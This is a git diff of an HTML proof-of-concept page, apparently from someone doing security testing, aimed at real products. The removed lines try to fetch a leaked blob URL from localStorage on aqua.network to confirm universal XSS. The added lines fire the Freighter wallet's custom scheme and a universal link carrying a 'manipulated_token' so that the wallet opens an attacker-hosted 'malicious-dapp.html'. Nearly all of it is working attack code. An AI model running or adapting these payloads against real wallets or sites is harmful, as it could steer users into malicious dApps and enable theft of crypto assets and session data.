@@ -1,32 +1,48 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Blob Inheritance Test</title></head>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Deep Link / Universal Link Test - Freighter</title>
+</head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:15px">
-<h2>STEP 2 - Test di 0x403for</h2>
+<h2>Deep Link / Scheme Injection Test</h2>
 <pre id=log></pre>
-<button onclick="checkLeak()" style="padding:14px;width:100%;background:#0f0">1. Check localStorage leak</button>
-<button onclick="tryFetchBlob()" style="padding:14px;width:100%;background:#0f0;margin-top:6px">2. TRY FETCH blob: dari aqua.network</button>
-<button onclick="tryIframeBlob()" style="padding:14px;width:100%;background:#0f0;margin-top:6px">3. TRY IFRAME blob:</button>
-<iframe id=frame style="width:100%;height:200px;background:white"></iframe>
+
+<button onclick="testCustomScheme()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;cursor:pointer">1. Test Custom Scheme / Intent</button>
+<button onclick="testUniversalLink()" style="padding:14px;width:100%;background:#0f0;color:#000;font-weight:bold;margin-top:10px;cursor:pointer">2. Test Universal Link Manipulation</button>
+
 <script>
-function log(t){document.getElementById('log').textContent+=t+'\n'}
-function checkLeak(){
-  let b=localStorage.getItem('aqua_blob_url');
-  log('Leak: '+b);
+function log(t){
+  let logEl = document.getElementById('log');
+  logEl.textContent += '[' + new Date().toLocaleTimeString() + '] ' + t + '\n';
 }
-async function tryFetchBlob(){
-  let blobUrl=localStorage.getItem('aqua_blob_url');
-  try{
-    let res=await fetch(blobUrl);
-    let text=await res.text();
-    log('FETCH SUCCESS: '+text.substring(0,200));
-    if(text.includes('SECRET')) log('>>> CRITICAL UXSS CONFIRMED');
-  }catch(e){log('BLOCKED: '+e.message)}
+
+function testCustomScheme(){
+  // Ubah 'freighter://' sesuai dengan custom scheme yang terdaftar pada aplikasi target
+  let maliciousUrl = 'freighter://dapp?url=https://0x403for.github.io/malicious-dapp.html&session=manipulated_token';
+  log('[*] Mencoba memicu skema kustom: ' + maliciousUrl);
+  
+  try {
+    window.location.href = maliciousUrl;
+    setTimeout(() => {
+      log('[?] Jika aplikasi tidak merespons, skema kustom mungkin tidak terdaftar atau diblokir.');
+    }, 2000);
+  } catch(e) {
+    log('[-] Error: ' + e.message);
+  }
 }
-function tryIframeBlob(){
-  let blobUrl=localStorage.getItem('aqua_blob_url');
-  document.getElementById('frame').src=blobUrl;
+
+function testUniversalLink(){
+  // Uji manipulasi parameter pada domain Universal Link resmi aplikasi target
+  // Contoh format URL universal link dengan menyisipkan parameter arbitrer atau dApp eksternal
+  let targetUniversalLink = 'https://wallet.freighter.app/browser?url=https://0x403for.github.io/malicious-dapp.html';
+  log('[*] Mengarahkan ke Universal Link: ' + targetUniversalLink);
+  
+  try {
+    window.location.href = targetUniversalLink;
+  } catch(e) {
+    log('[-] Error: ' + e.message);
+  }
 }
 </script>
 </body>
